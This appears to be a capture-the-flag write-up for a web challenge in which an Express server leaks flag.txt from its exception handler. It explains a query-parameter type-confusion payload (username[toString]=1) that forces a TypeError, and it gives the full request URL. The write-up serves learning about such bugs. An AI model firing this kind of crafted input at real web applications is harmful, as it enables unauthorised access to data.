# Javascript Puzzle

This is a web challenge where we need to force a javascript exception.

The server runs this code:

```js
const express = require('express')

const app = express()
const port = 8000

app.get('/', (req, res) => {
    try {
        const username = req.query.username || 'Guest'
        const output = 'Hello ' + username
        res.send(output)
    }
    catch (error) {
        res.sendFile(__dirname + '/flag.txt')
    }
})

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`)
})
```

In JavaScript, `username["toString"]` and `username.toString` are the same. When concatenating `username` with a string, JavaScript calls `toString()`. By setting `username[toString]=1`, we make `username` an object `{ toString: "1" }`, so `toString` isn’t a function, triggering a `TypeError` and hitting the `catch` block to leak `flag.txt`.

To get the flag, we can send a GET request to: `https://js-puzzle-974780027560.us-east5.run.app/?username[toString]=1`

This breaks concatenation and leaks the flag.
